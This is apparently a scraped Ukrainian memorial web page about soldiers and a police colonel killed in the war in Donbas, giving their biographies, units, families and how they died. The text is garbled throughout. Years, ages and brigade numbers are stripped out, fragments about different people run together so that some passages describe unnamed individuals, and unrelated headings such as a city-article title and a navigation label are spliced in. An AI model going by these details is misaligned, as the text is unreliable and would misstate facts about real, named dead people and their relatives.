	<p>Відтоді двічі продовжував контракт. Посада — навідник СПГ станкового протитанкового гранатомета. Негативу за ним жодного. Ворог прийшов до нас зі зброєю і буде знищений. Від рук ворогів України, окупантів, які хочуть зняття санкцій і жити так, якби і нічого не було, в зоні проведення бойових дій загинув офіцер Олександр Маланчук — випускник Національної академії сухопутних військ, який проходив службу у й окремій гірсько-штурмовій бригаді. Згадаймо про нього у молитві!!! Начальник НАСВ ім.</p>
<p>Батько Василь Миколайович Маланчук — полковник, до року був першим заступником комісара Чернівецького обласного військомату. Також представляв Академію сухопутних військ на спортивних змаганнях. Олексій Купріков народився 13 січня року в Росії, у Читинській області. Жив у селищі Черкаське Новомосковського району на Дніпропетровщині, де дислокується 93 омбр.</p>
<p>Отримав середню технічну освіту. Олексій вирішив піти на війну, після того як на фронті загинув його друг. Контракт із ЗСУ підписав у листопаді року. Хоча спершу чоловік проходив службу на посаді стрільця-помічника гранатометника, а вже потім, після навчання у навчальному центрі, здобув новий фах. Льоша ж, навпаки, навіть якщо чогось і не знав, ґрунтовно та розсудливо намагався зрозуміти у деталях, як що працює, як краще полагодити техніку. І в нього це дуже добре виходило. Був спокійний, розважливий, зацікавлений у своїй роботі.</p><img src="https://image.isu.pub/180831185644-7c729f57b391941f5bedb5cb1cf6cf6b/jpg/page_1.jpg" alt="1. Сергій Дичек" style="max-width: 480px; max-height: 480px;"/><p>Олексій воював у районі Авдіївки, Новоселівки Другої, в останню ротацію — на околицях Кримського на Луганщині. Там, під час обстрілу позиції 93 омбр біля Кримського, і загинув 9 квітня, зазнавши множинних осколкових поранень.</p><strong><a id='u1'></a><h2>Усі загиблі на Донбасі року: згадаймо їхні імена й обличчя | Новинарня</h2></strong><p>Напередодні загибелі Лєший розмовляв по телефону із сином. Невдовзі мав приїхати додому у відпустку…. Поховали солдата в смт Черкаське, поруч із батьком. Залишилися цивільна дружина, річний син Владислав, мама та рідна сестра, яка також служить у й бригаді. Леонід Скакуненко не дожив десять днів до свого ліття. У році, після початку війни, був мобілізований до лав Національної гвардії. А згодом повернувся на війну вже у Збройних силах, з якими підписав контракт. Брав участь бойових діях у Новотроїцькому, Новоселівці Другій, на околицях Кримського.</p>
<p>У Вербну неділю, 12 квітня, окупанти обстріляли позиції ОС поблизу Кримського на Луганщині з ручних протитанкових гранатометів.</p><strong><a id='u2'></a><h2>Усі загиблі на Донбасі 2021 року: згадаймо їхні імена й обличчя</h2></strong><p>Леонід, який саме перебував на бойовому чергуванні, отримав поранення, несумісні з життям…. Коли почалися бойові дії на сході року, Андрій був у першій хвилі мобілізованих. Тож пішов навчатися в Національну академію Сухопутних військ ім. На війну Андрій повернувся офіцером. Лейтенант, командир механізованого взводу ї окремої механізованої бригади імені Лицарів Зимового походу. Особовий склад, його підлеглі говорять, що Андрій був хорошим командиром, чув, розумів людей.</p><strong><a id='u3'></a><h2>Стаханов (город)</h2></strong><p>Дуже тепло про нього відгукуються. Але здійснити їх не судилося. Осколками йому посікло правий бік. Там множинні осколкові поранення. Їх дуже багато було, вони виявилися несумісні з життям. Поховали лейтенанта в Любомлі.</p>
		
	<p>По українських позиціях у районі Жолобок-Кримське на Луганщині ворог ударив з СПГ та важкої артилерії калібрів й мм. Олексій — родом із села Гірке Гуляйпільського району, що в Запоріжжі. Народився 30 березня року. Приєднався до ї бригади у му, коли підрозділ стояв на Авдіївському напрямку на Донеччині.</p>
<p>Служив на посаді водія в механізованому батальйоні. В Олексія лишилися річна донька від першого шлюбу Ліда, кохана дівчина Ліля, з якою він планував одружитись, старенька бабуся, молодший брат Микола, старша сестра Тетяна. Олександр народився 25 березня року в Старобільську на Луганщині. Згодом родина переїхала у Вінницьку область, в село Буди Тростянецького району.</p>
<p>Як розповідають сусіди, Карпики живуть дуже скромно, і Сашко мріяв заробити, щоб купити рідним просторий будинок. Після школи хлопець закінчив Немирівський професійний ліцей, здобув фах електрогазозварювальника. А коли навесні го прийшла повістка на строкову службу, вирішив одразу підписати контракт із ЗСУ. Казав, що мріє в майбутньому стати офіцером. Через три роки — підписав контракт удруге. Старший солдат, хімік відділення радіаційного, хімічного, біологічного захисту го окремого полку оперативного призначення. Близько у нього поцілив ворожий снайпер. Куля влучила під бронежилет, пошкодивши великі кровоносні судини.</p>
<p>Медики Старобільської лікарні боролися за Сашкове життя ще кілька годин. На жаль, після тригодинної операції смерть виявилася сильнішою.</p><a id='u4'></a><h3>Навігаційне меню</h3><p>Про полковника поліції Сергія Губанова можна розповідати дуже довго. Це була справді непересічна людина. Хотів служити строкову у ВДВ, але зрештою потрапив у ту окрему аеромобільну бригаду. А після демобілізації пішов у правоохоронні органи. Починаючи з року, він пройшов шлях від оперативника карного розшуку Стахановської міського відділу міліції до начальника Луганського міського управління. Паралельно закінчив спершу Донецький інститут внутрішніх справ, а потім — Національну академію ВС у Києві. Події року застали його на посаді начальника Ленінського районного відділу міліції Луганська.</p>
<p>Усвідомлюючи, до чого все йде, Губанов встиг вивезти з відділку всю зброю й разом із колегами заховати її в надійних місцях. Тоді Губанова вдалося витягти. Але після цього він тиждень ходив на роботу з гранатою в барсетці — вдруге в полон потрапляти не збирався. Знаючи авторитет Губанова, московські куратори луганських бойовиків доклали багато зусиль, щоб завербувати його на свій бік. Довелося терміново кидати дім, роботу, і вибиратися з міста.</p>
		
	<p>Відтоді вони більше не спілкувалися. Разом із ним звільняв Лисичанськ, інші населені пункти Луганщини. Жив у казармі зі своїми бійцями, там же і їв, і спав.</p>
		
	
